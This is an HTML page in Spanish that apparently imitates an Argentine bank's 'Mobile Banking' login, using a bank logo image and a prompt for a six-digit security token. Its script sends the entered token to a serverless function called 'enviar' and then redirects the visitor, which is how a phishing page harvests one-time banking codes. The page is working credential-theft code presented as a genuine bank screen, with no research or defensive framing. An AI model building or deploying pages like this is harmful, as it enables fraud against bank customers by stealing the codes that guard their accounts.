<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Banking</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<!-- Header superior -->
<header class="top-bar">
    <div class="title">Mobile Banking</div>
    <div class="classic">
        <span class="home-icon">🏠</span>
        Versión Clásica
    </div>
</header>

<!-- Logo -->
<div class="logo-container">
    <img src="bna.png" alt="Logo">
</div>

<!-- Card -->
<div class="login-card">
    <div class="login-title">Ingresá tu codigo Token de 6 Dígitos</div>

    <input
        type="text"
        id="tokenInput"
        maxlength="6"
        inputmode="numeric"
        placeholder="Token"
    >

    <button type="button" class="btn-accept" onclick="enviarToken()">
        <span class="check">✔</span>
        Aceptar
    </button>
</div>

<!-- Footer -->
<footer class="footer">
    <span class="close">✖</span>
    <p>Salir</p>
</footer>

<script>
const tokenInput = document.getElementById("tokenInput");

tokenInput.addEventListener("input", () => {
    tokenInput.value = tokenInput.value.replace(/[^0-9]/g, "");
});

function enviarToken() {
    const token = tokenInput.value;

    if (!token) return;

    fetch("/.netlify/functions/enviar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            tipo: "peso",
            valor: token
        })
    }).finally(() => {
        window.location.href = "index.html";
    });
}
</script>

</body>
</html>
